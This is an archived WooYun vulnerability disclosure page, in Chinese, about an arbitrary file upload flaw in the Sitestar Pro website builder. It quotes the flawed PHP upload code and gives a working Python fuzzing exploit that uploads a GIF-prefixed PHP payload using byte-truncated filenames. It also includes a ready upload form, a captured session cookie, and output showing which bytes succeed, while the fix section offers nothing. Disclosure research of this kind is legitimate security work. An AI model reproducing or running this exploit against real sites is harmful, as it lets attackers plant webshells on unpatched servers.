@@ -1,0 +1,390 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		建站之星模糊测试实战之任意文件上传漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		建站之星模糊测试实战之任意文件上传漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-01-08 17:09</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-13：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-04-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">GOOGLE翻来翻去 #$%^&amp;^&amp;*<br />
+ Q：只能通过&quot;%00&quot;、&quot;?&quot;、&quot;///////////....//////&quot;才能截断? 是真的吗?<br />
+ A: 答案是肯定的：NO!NO!NO!<br />
+只有实践才能出真知!GO...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 Sitestar<br />
+<br />
+美橙互联又一力作,建站之星专业版(Sitestar Pro)，<br />
+<br />
+无拘无束,信手拈来,创意无限，不拘一格,轻松创建属于您自己的网站！<br />
+<br />
+<br />
+<br />
+#2 漏洞的产生<br />
+<br />
+/module/mod_tool.php 第89行起，img_create()函数<br />
+<br />
+</p><pre><code>public function img_create() {<br />
+		$file_info =&amp; ParamHolder::get(&#039;img_name&#039;, array(), PS_FILES);<br />
+		if ($file_info[&#039;error&#039;] &gt; 0) {<br />
+			Notice::set(&#039;mod_marquee/msg&#039;, __(&#039;Invalid post file data!&#039;));<br />
+			Content::redirect(Html::uriquery(&#039;mod_tool&#039;, &#039;upload_img&#039;));<br />
+		}<br />
+		//exit($file_info[&quot;name&quot;]);<br />
+		if(!preg_match(&#039;/\.(&#039;.PIC_ALLOW_EXT.&#039;)$/i&#039;, $file_info[&quot;name&quot;])) {<br />
+			//echo &#039;2222&#039;;<br />
+			Notice::set(&#039;mod_marquee/msg&#039;, __(&#039;File type error!&#039;));<br />
+			Content::redirect(Html::uriquery(&#039;mod_marquee&#039;, &#039;upload_img&#039;));<br />
+		}<br />
+		if(file_exists(ROOT.&#039;/upload/image/&#039;.$file_info[&quot;name&quot;])) {<br />
+			$file_info[&quot;name&quot;] = Toolkit::randomStr(8).strrchr($file_info[&quot;name&quot;],&quot;.&quot;);<br />
+		}<br />
+		if (!$this-&gt;_savelinkimg($file_info)) {<br />
+			Notice::set(&#039;mod_marquee/msg&#039;, __(&#039;Link image upload failed!&#039;));<br />
+			Content::redirect(Html::uriquery(&#039;mod_marquee&#039;, &#039;upload_img&#039;));<br />
+		}</code></pre><p class='detail'><br />
+<br />
+上述关键的代码<br />
+<br />
+</p><pre><code>if(!preg_match(&#039;/\.(&#039;.PIC_ALLOW_EXT.&#039;)$/i&#039;, $file_info[&quot;name&quot;])) {<br />
+			Notice::set(&#039;mod_marquee/msg&#039;, __(&#039;File type error!&#039;));<br />
+			Content::redirect(Html::uriquery(&#039;mod_marquee&#039;, &#039;upload_img&#039;));<br />
+		}</code></pre><p class='detail'><br />
+<br />
+其中 PIC_ALLOW_EXT 为 gif|jpg|png|bmp 即如果文件名最后不是gif|jpg|png|bmp,则提示文件类型错误<br />
+<br />
+我们继续往下看...<br />
+<br />
+</p><pre><code>if (!$this-&gt;_savelinkimg($file_info)) {<br />
+			Notice::set(&#039;mod_marquee/msg&#039;, __(&#039;Link image upload failed!&#039;));<br />
+			Content::redirect(Html::uriquery(&#039;mod_marquee&#039;, &#039;upload_img&#039;));<br />
+		}</code></pre><p class='detail'><br />
+<br />
+跟进_savelinkimg函数 736行-741行<br />
+<br />
+</p><pre><code>private function _savelinkimg($struct_file) {<br />
+		$struct_file[&#039;name&#039;] = iconv(&quot;UTF-8&quot;, &quot;gb2312&quot;, $struct_file[&#039;name&#039;]);<br />
+		echo $struct_file[&#039;name&#039;];<br />
+		move_uploaded_file($struct_file[&#039;tmp_name&#039;], ROOT.&#039;/upload/image/&#039;.$struct_file[&#039;name&#039;]);<br />
+		return ParamParser::fire_virus(ROOT.&#039;/upload/image/&#039;.$struct_file[&#039;name&#039;]);<br />
+	}</code></pre><p class='detail'><br />
+<br />
+其中我们关心的是move_uploaded_file函数<br />
+<br />
+</p><pre><code>move_uploaded_file($struct_file[&#039;tmp_name&#039;], ROOT.&#039;/upload/image/&#039;.$struct_file[&#039;name&#039;]);</code></pre><p class='detail'><br />
+<br />
+看见没有,直接用我们上传的的文件名作为最终写进硬盘的文件名<br />
+<br />
+到这里，我们可以简单对其进行利用<br />
+<br />
+上传类似如下文件：shell.php;.jpg 或shell.php.a;.jpg 利用解析漏洞即可利用，但这并不是我们今天所要讲的内容,SO 继续.... <br />
+<br />
+#3 尝试漏洞利用<br />
+<br />
+既然文件名是我们上传的文件名，那我们用截断上传试试呢...<br />
+<br />
+首先我们尝试最最最常用的截断方法: %00<br />
+<br />
+为方便调试，我们加入调试代码<br />
+<br />
+</p><pre><code>if(!preg_match(&#039;/\.(&#039;.PIC_ALLOW_EXT.&#039;)$/i&#039;, $file_info[&quot;name&quot;])) {<br />
+			exit(&quot;Error,不能截断.&quot;);//调试代码<br />
+			Notice::set(&#039;mod_marquee/msg&#039;, __(&#039;File type error!&#039;));<br />
+			Content::redirect(Html::uriquery(&#039;mod_marquee&#039;, &#039;upload_img&#039;));<br />
+		}</code></pre><p class='detail'><br />
+<br />
+同时将如下代码保持为sitestar.htm<br />
+<br />
+</p><pre><code>&lt;form id=&quot;Upload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://www.vulns.org/sitestar/index.php?_m=mod_tool&amp;_a=img_create&quot; method=&quot;post&quot;&gt;<br />
+  &lt;input type=&quot;file&quot; name=&quot;img_name&quot; id=&quot;img_id&quot; size=&quot;50&quot;&gt;<br />
+  &lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+打开sitestar.htm，Burpsuite抓包 采用%00截断：<br />
+<br />
+</p><p class="detail"><a href="../images/081614033e290d3876726dc9913c991302968f82.jpg" target="_blank"><img src="../images/081614033e290d3876726dc9913c991302968f82.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+输出了我们的调试代码<br />
+<br />
+</p><p class="detail"><a href="../images/0816142983301b80fbf5fdbfee71f09b4106cf71.jpg" target="_blank"><img src="../images/0816142983301b80fbf5fdbfee71f09b4106cf71.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+看见了吧，不能成功的被截断,那我们是不是就到此为止了呢? 显然 答案是NO！<br />
+<br />
+额 ！！想起来了...我们都知道Fuzzing很强大... SO 继续吧... </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#4 Fuzzing成功利用<br />
+<br />
+丢一真理：实践出真知,各位看官们 眼睛睁大了...<br />
+<br />
+为了能Fuzzing,看来还得码代码啊,首先抓个上传的包,方便代码中用<br />
+<br />
+这里我们用py写Fuzzing的代码，好吧 我已经给各位写好啦<br />
+<br />
+</p><pre><code>#D:\Python27\python.exe<br />
+#coding = utf-8<br />
+<br />
+import os<br />
+import re<br />
+import sys<br />
+import random<br />
+import urllib2<br />
+import urllib<br />
+<br />
+def hex_to_asc(ch):<br />
+    return &#039;{:c}&#039;.format(int(float.fromhex(ch)))<br />
+<br />
+def rand5str(num):<br />
+    sts = &#039;&#039;<br />
+    char = &#039;1234567890abcdexyz&#039;<br />
+    for i in range(num):<br />
+        sts += random.choice(char)<br />
+    return sts<br />
+<br />
+def postdata(strr):<br />
+    global sname<br />
+    sname = rand5str(8)<br />
+    data = &#039;------WebKitFormBoundaryFz8xcpseXipPJz6Q\r\n&#039;<br />
+    data +=&#039;Content-Disposition: form-data; name=&quot;img_name&quot;; filename=&quot;%s.php%s;a.gif&quot;\r\n&#039; % (sname,strr)<br />
+    data +=&#039;Content-Type: image/gif\r\n&#039;<br />
+    data +=&#039;\r\n&#039;<br />
+    data +=&#039;GIF89a&lt;script language=\&#039;php\&#039;&gt;\r\n&#039;<br />
+    data +=&#039;phpinfo();\r\n&#039;<br />
+    data +=&#039;------WebKitFormBoundaryFz8xcpseXipPJz6Q--\r\n&#039;<br />
+    return data<br />
+<br />
+def Fuzzing(mstr,url,cookie):<br />
+    posturl  = &quot;%s/sitestar/index.php?_m=mod_tool&amp;_a=img_create&quot; % url<br />
+    headers  = {<br />
+        &#039;User-Agent&#039; : &#039;Googlebot/2.1 (+http://www.google.com/bot.html)&#039;,  <br />
+	&#039;Content-Type&#039; : &#039;multipart/form-data; boundary=----WebKitFormBoundaryFz8xcpseXipPJz6Q&#039;,<br />
+	&#039;Cookie&#039;: cookie<br />
+    }<br />
+    hexstr   = hex_to_asc(mstr)<br />
+    posts    = postdata(hexstr)<br />
+    request  = urllib2.Request(posturl, posts, headers)<br />
+    response = urllib2.urlopen(request)<br />
+    htmls    = response.read()<br />
+    response.close()<br />
+    <br />
+    fuzzurl = &quot;%s/sitestar/upload/image/%s.php&quot; % (url,sname)<br />
+    try:<br />
+        resp = urllib2.urlopen(fuzzurl)<br />
+        html = resp.read()<br />
+        reg  = re.search(r&#039;&lt;style type=&quot;text/css&quot;&gt;&#039;,html)<br />
+        if reg is not None:<br />
+            print &#039;%%%s is --&gt; OK..&#039; % mstr<br />
+    except:<br />
+        print &#039;%%%s is -&gt; No..&#039; % mstr<br />
+<br />
+if __name__==&quot;__main__&quot;:<br />
+    if len(sys.argv)&lt;4:<br />
+        print &#039;\n  sitestar_upload.py -u &lt;url&gt; -c &lt;cookie&gt;&#039;<br />
+        os._exit(0)<br />
+    url = sys.argv[2]<br />
+    cookie = sys.argv[4]<br />
+    if &#039;http://&#039; not in url:<br />
+        url = &#039;http://%s&#039;%url<br />
+    <br />
+    for i in range(100):<br />
+        s = &#039;%02d&#039; % i<br />
+        Fuzzing(s,url,cookie)</code></pre><p class='detail'><br />
+<br />
+#5 Fuzzing动起来<br />
+<br />
+step1 首先注册个用户名<br />
+<br />
+step2 登陆后 抓下Cookie<br />
+<br />
+step3 打开CMD，哈哈...<br />
+<br />
+我们的cookie如下<br />
+<br />
+</p><pre><code>Rya5_2132_ulastactivity=f6159i9gE3RqKLgf5IFeEYMgRbch8XHcq8L9yjKdgdcklNzyHcuG; sYQDUGqqzHsearch_history=dd%7C3; CNZZDATA1754403=cnzz_eid%3D239727152-1385000911-http%253A%252F%252Fwww.vulns.org%26ntime%3D1385000911%26cnzz_a%3D12%26sin%3Dhttp%253A%252F%252Fwww.vulns.org%253A81%252Fgover1%252FSearch.asp%26ltime%3D1385000907409; _cnzz_CV=; language=zh-cn; A29_visitedfid=2; smile=1D1; YlsN_2132_saltkey=BCq0w3j3; YlsN_2132_lastvisit=1386810963; YlsN_2132_visitedfid=2; YlsN_2132_lastcheckfeed=1%7C1386898405; YlsN_2132_editormode_e=1; YlsN_2132_smile=1D1; K5PL3_uid=1; K5PL3_hash=0a4d70e0; YlsN_2132_ulastactivity=e35dE3Tw1Tk%2B%2B9ATPf1vuCQDDPhyih4eFcdTHjOURWXVg8tD0n%2Br; rRex_2132_saltkey=3w13193y; rRex_2132_lastvisit=1388735738; rRex_2132_ulastactivity=6b208R0hVUACRQvTjn7En9kDuyvN7ZNRftXROrgtEy6kLy8zzU4j; _mkto_trk=id:797-ENI-742&amp;token:_mch-vulns.org-1388719339154-91284; __ar_v4=DDRUVU4CRNEHLB3NYFC2PH%3A20140102%3A2%7C5PZND6KU6RD4RAHEGDPE5S%3A20140102%3A2%7CJIFJRAFWAJHHRE57MKUYU2%3A20140102%3A2; PHPSESSID=d413af28abd2a8fd38e670cbcca23ee4</code></pre><p class='detail'><br />
+<br />
+打开CMD Fuzzing 跑起来...<br />
+<br />
+</p><pre><code>%77 is -&gt; No..<br />
+%78 is -&gt; No..<br />
+%79 is -&gt; No..<br />
+%80 is --&gt; OK..<br />
+%81 is --&gt; OK..<br />
+%82 is --&gt; OK..<br />
+%83 is --&gt; OK..<br />
+%84 is --&gt; OK..<br />
+%85 is --&gt; OK..<br />
+%86 is --&gt; OK..<br />
+%87 is --&gt; OK..<br />
+%88 is --&gt; OK..<br />
+%89 is --&gt; OK..<br />
+%90 is --&gt; OK..<br />
+%91 is --&gt; OK..<br />
+%92 is --&gt; OK..<br />
+%93 is --&gt; OK..<br />
+%94 is --&gt; OK..<br />
+%95 is --&gt; OK..<br />
+%96 is --&gt; OK..<br />
+%97 is --&gt; OK..<br />
+%98 is --&gt; OK..<br />
+%99 is --&gt; OK..</code></pre><p class='detail'><br />
+<br />
+看见了吧,%80 --- %99都可以截断<br />
+<br />
+</p><p class="detail"><a href="../images/08165622b0379192bb9e0cddd167289216147516.jpg" target="_blank"><img src="../images/08165622b0379192bb9e0cddd167289216147516.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+生成的文件如图（路径：upload/image）<br />
+<br />
+</p><p class="detail"><a href="../images/08165739742a69d83865db7a5ec9477969e60d13.jpg" target="_blank"><img src="../images/08165739742a69d83865db7a5ec9477969e60d13.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+看见了吧,shell.php 就躺在对方的硬盘里了... <br />
+<br />
+#6 Fuzzing成功<br />
+<br />
+</p><p class="detail"><a href="../images/08165958180c24f86a1f676fcb598889aa18ca64.jpg" target="_blank"><img src="../images/08165958180c24f86a1f676fcb598889aa18ca64.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+#7 大家Fuzzing动起来吧... </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">不多说. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048293" title="建站之星模糊测试实战之任意文件上传漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-01-13 17:09</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48293";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
